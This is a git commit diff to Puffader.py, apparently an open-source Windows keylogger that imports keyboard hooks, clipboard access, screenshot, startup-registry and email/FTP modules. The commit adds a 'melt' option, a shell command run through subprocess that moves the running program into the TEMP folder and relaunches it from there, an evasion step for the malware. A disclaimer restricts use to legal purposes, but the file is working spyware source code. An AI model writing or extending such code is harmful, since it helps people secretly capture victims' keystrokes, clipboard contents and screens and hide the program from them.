460d5ffb5067687a516da4b6ee806fbe64e2b31f
xp4xbox <nicman1080@gmail.com>
2018-02-14 16:53:37 -0500

    Added option to melt file #40

--- Puffader.py
+++ Puffader.py
@@ -8,7 +8,7 @@ MIT License: https://github.com/xp4xbox/Puffader/blob/master/LICENSE
 NOTE: This program must be used for legal purposes only! I am not responsible for anything you do with it.
 '''
 
-import smtplib, time, os, threading, sys
+import smtplib, time, os, threading, sys, subprocess
 import win32console, win32gui, win32event, win32api, winerror, win32clipboard
 from sys import exit; from ftplib import FTP; from urllib2 import urlopen; from shutil import copyfile
 from email.MIMEMultipart import MIMEMultipart; from email.MIMEImage import MIMEImage; from _winreg import *
@@ -16,7 +16,7 @@ try:
     import pythoncom, pyHook, pyautogui
     from pyHook import GetKeyState, HookConstants
 except ImportError:
-    print("required pyhook, pywin32 and pyautogui")
+    print "required pyhook, pywin32 and pyautogui"
     exit()
 
 
@@ -46,6 +46,7 @@ blnLogClick = "False"  # for logging window clicks
 blnAddToStartup = "False"
 
 blnLogClipboard = "False"
+blnMelt = "False"
 
 
 def hide():
@@ -71,6 +72,18 @@ def GetExIp():  # function to get external ip
         strExIP = "?"
 # obj defined for later use for screenshot timer
 objTimer2 = threading.Timer(0, GetExIp); objTimer2.start()
+
+
+def melt():
+    TMP = os.environ["TEMP"]
+    strNewFile = TMP + "\\" + os.path.basename(sys.argv[0])
+    if not os.getcwd() == TMP:  # if the current dir is not temp
+        subprocess.Popen("ping 1.1.1.1 -n 1 & move /y " + os.path.realpath(sys.argv[0]) + " " +  # move file to TMP and then relaunch
+                         strNewFile + " & cd  /d " + TMP + " & " + strNewFile , shell=True)
+        exit(0)
+
+if blnMelt == "True":
+    melt()
 
 
 def AddToStartup():
